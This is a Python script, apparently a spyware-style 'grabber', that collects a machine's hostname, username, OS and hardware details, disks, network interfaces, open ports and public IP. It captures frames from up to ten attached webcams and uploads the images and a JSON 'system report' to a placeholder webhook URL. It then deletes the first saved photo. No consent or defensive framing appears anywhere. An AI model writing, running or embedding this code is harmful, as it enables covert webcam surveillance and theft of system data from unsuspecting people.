import os
import cv2
import json
import socket
import platform
import requests
import psutil
import os

WEBHOOK_URL = "CHANGE_ME"

def ip():

    try:

        return requests.get(
            "https://ipinfo.io/json",
            timeout=5
        ).json()

    except Exception as e:

        return {
            "error":
            str(e)
        }


def pc():

    users = psutil.users()

    return {

        "hostname":
        socket.gethostname(),

        "username":
        os.getenv("USERNAME")
        or os.getenv("USER"),

        "local_ip":
        socket.gethostbyname(
            socket.gethostname()
        ),

        "os":
        platform.system(),

        "release":
        platform.release(),

        "version":
        platform.version(),

        "arch":
        platform.machine(),

        "cpu":
        platform.processor(),

        "cores":
        psutil.cpu_count(),

        "threads":
        psutil.cpu_count(
            logical=True
        ),

        "ram_gb":
        round(
            psutil.virtual_memory().total
            / (1024 ** 3),
            2
        ),

        "boot_time":
        psutil.boot_time(),

        "users":
        [u.name for u in users]
    }


def disks():

    out = []

    for p in psutil.disk_partitions():

        try:

            u = psutil.disk_usage(
                p.mountpoint
            )

            out.append({

                "device":
                p.device,

                "mount":
                p.mountpoint,

                "fs":
                p.fstype,

                "total_gb":
                round(
                    u.total / (1024 ** 3),
                    2
                ),

                "used_gb":
                round(
                    u.used / (1024 ** 3),
                    2
                ),

                "free_gb":
                round(
                    u.free / (1024 ** 3),
                    2
                )
            })

        except:
            pass

    return out


def net():

    out = {}

    try:

        for name, addrs in (
            psutil.net_if_addrs()
            .items()
        ):

            out[name] = []

            for a in addrs:

                out[name].append({

                    "ip":
                    a.address,

                    "netmask":
                    a.netmask,

                    "broadcast":
                    a.broadcast
                })

    except Exception as e:

        out["error"] = str(e)

    return out


def ports():

    out = []

    try:

        for c in psutil.net_connections(
            kind="inet"
        ):

            if c.laddr:

                out.append({

                    "ip":
                    c.laddr.ip,

                    "port":
                    c.laddr.port,

                    "status":
                    c.status
                })

    except Exception as e:

        out.append({
            "error":
            str(e)
        })

    return out


def cams():

    found = []

    for i in range(10):

        try:

            cap = cv2.VideoCapture(i)

            ok, frame = cap.read()

            if ok:

                file = f"cam_{i}.jpg"

                cv2.imwrite(
                    file,
                    frame
                )

                with open(file, "rb") as f:

                    requests.post(
                        WEBHOOK_URL,
                        files={
                            "file":
                            f
                        }
                    )

                found.append(i)

            cap.release()

        except:
            pass

    return {

        "cams":
        found
    }


def send(data):

    txt = json.dumps(
        data,
        indent=2
    )

    payload = {

        "content":
        "system report",

        "embeds": [

            {

                "title":
                "system",

                "description":
                f"```json\n{txt[:3500]}\n```"
            }
        ]
    }

    r = requests.post(
        WEBHOOK_URL,
        json=payload
    )

    print(r.status_code)


if __name__ == "__main__":

    data = {

        "pc":
        pc(),

        "ip":
        ip(),

        "network":
        net(),

        "ports":
        ports(),

        "disks":
        disks(),

        "cams":
        cams()
    }

    send(data)
    os.remove("cam_0.jpg")